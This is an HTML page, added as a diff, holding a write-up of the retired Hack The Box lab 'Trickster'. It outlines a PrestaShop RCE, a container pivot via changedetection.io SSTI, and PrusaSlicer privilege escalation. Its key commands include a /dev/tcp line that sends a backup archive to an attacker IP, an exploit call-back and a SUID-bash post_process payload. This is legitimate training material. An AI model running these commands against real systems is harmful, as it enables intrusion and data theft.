@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Trickster | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Multi-Stage Web Exploitation</p>
+      <h1>HTB Trickster</h1>
+      <p class="headline">PrestaShop RCE, container pivot through changedetection.io and PrusaSlicer privilege escalation</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Trickster exposes a shop subdomain with Git leakage and a hidden PrestaShop admin path. The leaked repository and application files reveal enough context to exploit PrestaShop 8.1.5.</p>
+<h2>Initial Access</h2>
+<p>CVE-2024-34716 provides authenticated code execution and a shell. Database credentials from <code>parameters.php</code> and cracked hashes allow pivoting to the <code>james</code> user.</p>
+<h2>Container Pivot</h2>
+<p>Network enumeration from the host identifies an internal changedetection.io service. SSH port forwarding exposes it locally, and SSTI leads to root access inside the container. Backups inside the container reveal credentials for <code>adam</code>.</p>
+<h2>Privilege Escalation</h2>
+<p><code>adam</code> can run PrusaSlicer with sudo. Modifying the metadata inside a <code>.3mf</code> project to set a <code>post_process</code> command changes <code>/bin/bash</code> to SUID root, enabling <code>/bin/bash -p</code>.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">git-dumper http://shop.trickster.htb/.git/ shop-source</code></pre>
+<pre><code class="language-bash">python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip 10.10.16.31 --admin-path admin634ewutrx1jgitlooaj</code></pre>
+<pre><code class="language-bash">ssh -L 9000:172.17.0.2:5000 james@trickster.htb</code></pre>
+<pre><code class="language-bash">cat changedetection-backup.zip &gt; /dev/tcp/10.10.16.31/4445</code></pre>
+<pre><code class="language-bash">post_process = &quot;chmod u+s /bin/bash&quot;</code></pre>
+<pre><code class="language-bash">sudo ./prusaslicer -s /tmp/3mf/Trickster.3mf</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022171816.png" alt="trickster evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022171922.png" alt="trickster evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022172424.png" alt="trickster evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022172525.png" alt="trickster evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022173458.png" alt="trickster evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022173620.png" alt="trickster evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022173742.png" alt="trickster evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022174039.png" alt="trickster evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022174201.png" alt="trickster evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022174938.png" alt="trickster evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022175016.png" alt="trickster evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022175045.png" alt="trickster evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022175230.png" alt="trickster evidence 13" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022175514.png" alt="trickster evidence 14" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022181309.png" alt="trickster evidence 15" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022181933.png" alt="trickster evidence 16" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022182827.png" alt="trickster evidence 17" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022182910.png" alt="trickster evidence 18" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022183353.png" alt="trickster evidence 19" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022183659.png" alt="trickster evidence 20" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022183759.png" alt="trickster evidence 21" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022184337.png" alt="trickster evidence 22" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022185038.png" alt="trickster evidence 23" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022185435.png" alt="trickster evidence 24" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022190618.png" alt="trickster evidence 25" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022190801.png" alt="trickster evidence 26" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022190921.png" alt="trickster evidence 27" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022191329.png" alt="trickster evidence 28" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022192020.png" alt="trickster evidence 29" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022192428.png" alt="trickster evidence 30" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022192655.png" alt="trickster evidence 31" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022193734.png" alt="trickster evidence 32" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022193825.png" alt="trickster evidence 33" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022194027.png" alt="trickster evidence 34" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022195901.png" alt="trickster evidence 35" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022200120.png" alt="trickster evidence 36" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022200226.png" alt="trickster evidence 37" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022200714.png" alt="trickster evidence 38" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022201558.png" alt="trickster evidence 39" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022201845.png" alt="trickster evidence 40" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022201949.png" alt="trickster evidence 41" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022202148.png" alt="trickster evidence 42" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022202225.png" alt="trickster evidence 43" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022202335.png" alt="trickster evidence 44" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022202455.png" alt="trickster evidence 45" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022202623.png" alt="trickster evidence 46" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022202716.png" alt="trickster evidence 47" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022203001.png" alt="trickster evidence 48" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022203057.png" alt="trickster evidence 49" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022203202.png" alt="trickster evidence 50" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022203749.png" alt="trickster evidence 51" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022204303.png" alt="trickster evidence 52" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022210349.png" alt="trickster evidence 53" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022210456.png" alt="trickster evidence 54" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022210852.png" alt="trickster evidence 55" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022210935.png" alt="trickster evidence 56" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/trickster/Pasted%20image%2020241022211200.png" alt="trickster evidence 57" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
